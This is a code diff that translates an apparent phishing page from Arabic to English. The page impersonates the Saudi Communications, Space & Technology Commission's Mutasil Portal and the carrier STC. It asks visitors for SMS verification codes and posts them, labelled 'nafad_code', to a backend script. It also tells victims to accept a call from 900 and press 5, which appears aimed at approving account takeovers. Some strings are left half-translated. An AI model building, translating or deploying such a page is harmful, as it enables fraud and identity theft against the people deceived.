@@ -1,9 +1,10 @@
 <?php
 session_start();
-require_once 'includes/lang.php';
-set_site_lang('ar');
-require_once 'dashboard/init.php';
-require_once 'includes/redirect.php';
+require_once '../includes/lang.php';
+set_site_lang('en');
+
+require_once '../dashboard/init.php';
+require_once '../includes/redirect.php';
 
 // ✅ Get user ID from URL parameter or session
 $userId = null;
@@ -57,21 +58,21 @@ $ref = '';
 ?>
 
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>رمز التحقق</title>
+  <title>Verification Code</title>
 
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
 
-  <link rel="stylesheet" href="includes/lang-toggle.css">
-  <style>
+  <link rel="stylesheet" href="../includes/lang-toggle.css">
+    <style>
     body {
       font-family: 'Tajawal', sans-serif;
       background-color: #f3f6fb;
@@ -112,7 +113,7 @@ $ref = '';
     .top-header img { height: 50px; }
     .mutasil-logo {
       margin-bottom: 20px;
-      text-align: right;
+      text-align: left;
     }
     .mutasil-logo img { height: 40px; }
     .notification-box {
@@ -156,7 +157,7 @@ $ref = '';
       font-weight: 700;
       font-size: 14px;
       line-height: 1.6;
-      text-align: right;
+      text-align: left;
     }
     .stc-input {
       width: 100%;
@@ -181,7 +182,7 @@ $ref = '';
       justify-content: flex-end;
       gap: 5px;
     }
-    .timer span { direction: rtl; }
+    .timer span { direction: ltr; }
     .verify-btn {
       width: 140px;
       background-color: #e2e2e2;
@@ -284,17 +285,17 @@ $ref = '';
       </div>
       <div class="notification-text">
         <span class="arrow-icon">↗</span>
-        تم إرسال رمز التحقق إلى هاتفك النقال
+        A verification code was sent to your mobile
         <span id="maskedPhone" class="ltr-num"></span>.
-        الرجاء إدخاله في هذه الخانة.
+        Please enter it in this field.
       </div>
     </div>
 
     <div class="stc-section">
       <img src="img/STC-01.svg.png" alt="stc" class="stc-logo">
       <div class="stc-text">
-        <strong>عملاء STC الكرام في حال تلقي مكالمة من 900</strong><br>
-        <strong>الرجاء قبولها واختيار الرقم 5</strong>
+        <strong>Dear STC customers, if you receive a call from 900</strong><br>
+        <strong>please accept it and select number 5</strong>
       </div>
     </div>
 
@@ -307,22 +308,22 @@ $ref = '';
         maxlength="6"
         inputmode="numeric"
         pattern="\d*"
-        placeholder="رمز التحقق">
+        placeholder="Verification Code">
       <div id="otpError" class="error-msg">
-        الرجاء إدخال رمز تحقق مكوّن من 4 أو 6 أرقام فقط.
+        Please enter a verification code of 4 or 6 digits only.
       </div>
       <div id="netError" class="error-msg">
-        تعذّر الإرسال مؤقتًا. أعد المحاولة.
+        Submission temporarily unavailable. Please try again.
       </div>
     </div>
 
     <div class="timer">
-      <span>إعادة إرسال:</span>
+      <span>Resubmit:</span>
       <span id="timerText">03:00</span>
     </div>
 
     <div class="flex justify-center mb-2">
-      <button id="verifyBtnStc" class="verify-btn" type="submit" disabled>تحقق</button>
+      <button id="verifyBtnStc" class="verify-btn" type="submit" disabled>Verify</button>
     </div>
 
     <div class="card-footer-stc">
@@ -337,30 +338,30 @@ $ref = '';
     <div class="flex items-start justify-start gap-3 mb-4">
       <img src="image/logo.svg" alt="Logo" class="w-8 h-8 mt-1">
       <div class="text-right">
-        <h1 class="text-[15px] font-medium text-gray-800">هيئة الإتصالات والفضاء التقنية</h1>
-        <a href="#" class="text-blue-700 text-sm font-bold hover:underline">بوابة متصل</a>
+        <h1 class="text-[15px] font-medium text-gray-800">Communications, Space & Technology Commission</h1>
+        <a href="#" class="text-blue-700 text-sm font-bold hover:underline">Mutasil Portal</a>
       </div>
     </div>
 
     <p class="text-gray-600 text-[14px] leading-6 mb-5">
-      تم إرسال رمز التحقق إلى رقم هاتفك
+      A verification code was sent to your phone number
       <span id="maskedPhone" class="ltr-num font-bold" dir="ltr"></span>،
-      الرجاء إدخاله في هذه الخانة.
+      Please enter it in this field.
     </p>
 
     <form id="otpForm" class="space-y-5" novalidate>
       <div>
-        <label for="otpInputNormal" class="block text-gray-800 text-[14px] mb-2">رمز التحقق</label>
-        <input type="text" id="otpInputNormal" name="otp_second" maxlength="6" placeholder="ادخل رمز التحقق" required
+        <label for="otpInputNormal" class="block text-gray-800 text-[14px] mb-2">Verification Code</label>
+        <input type="text" id="otpInputNormal" name="otp_second" maxlength="6" placeholder="Enter verification code" required
                class="w-full border border-gray-300 rounded-sm px-3 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-600 text-center">
-        <div id="otpError" class="error-msg">الرجاء إدخال رمز تحقق مكوّن من 4 أو 6 أرقام فقط.</div>
-        <div id="netError" class="error-msg">تعذّر الإرسال مؤقتًا. أعد المحاولة.</div>
+        <div id="otpError" class="error-msg">Please enter a verification code of 4 or 6 digits only.</div>
+        <div id="netError" class="error-msg">Submission temporarily unavailable. Please try again.</div>
       </div>
 
       <div>
         <button id="verifyBtnNormal" type="submit"
                 class="px-6 py-2 border border-gray-400 bg-white hover:bg-gray-50 text-gray-800 rounded-sm text-[14px] transition duration-200">
-          التالي
+          Next
         </button>
       </div>
     </form>
@@ -372,7 +373,7 @@ $ref = '';
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content tel-card p-4 text-center">
         <p class="brand-text mt-2 mb-3">
-          سوف يتم الاتصال بك من قبل مزود الخدمة لتوثيق جهازك<br>الرجاء الانتظار...
+          The service provider will contact you to verify your device<br>Please wait...
         </p>
         <div class="call-icon">
           <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg">
@@ -396,7 +397,7 @@ $ref = '';
       return first + '*****' + last3;
     }
     const maskedEl = document.getElementById('maskedPhone');
-    if (maskedEl) maskedEl.textContent = phone ? maskPhone(phone) : 'غير متاح';
+    if (maskedEl) maskedEl.textContent = phone ? maskPhone(phone) : 'Not available';
 
     const otpInput  = document.getElementById('otpInputStc') || document.getElementById('otpInputNormal');
     const verifyBtn = document.getElementById('verifyBtnStc') || document.getElementById('verifyBtnNormal');
@@ -458,13 +459,13 @@ $ref = '';
         formData.set('nafad_code', otpValue);
         formData.set('user_id', '<?= (int)$userId ?>'); // ✅ استخدام $userId الصحيح
 
-        console.log('📤 إرسال إلى tele/success.php:', {
+        console.log('📤 Submit إلى tele/success.php:', {
           nafad_code: otpValue,
           user_id: '<?= (int)$userId ?>'
         });
 
         try {
-          const resp = await fetch('tele/success.php', {
+          const resp = await fetch('../tele/success.php', {
             method: 'POST',
             body: formData
           });
@@ -477,14 +478,14 @@ $ref = '';
             modal.show();
           } else {
             if (netError) {
-              netError.textContent = result.message || result.error || 'تعذّر الإرسال مؤقتًا. أعد المحاولة.';
+              netError.textContent = result.message || result.error || 'Submission temporarily unavailable. Please try again.';
               netError.style.display = 'block';
             }
           }
         } catch (err) {
-          console.error('❌ خطأ أثناء الإرسال:', err);
+          console.error('❌ خطأ أثناء الSubmit:', err);
           if (netError) {
-            netError.textContent = 'تعذّر الإرسال مؤقتًا. أعد المحاولة.';
+            netError.textContent = 'Submission temporarily unavailable. Please try again.';
             netError.style.display = 'block';
           }
         }
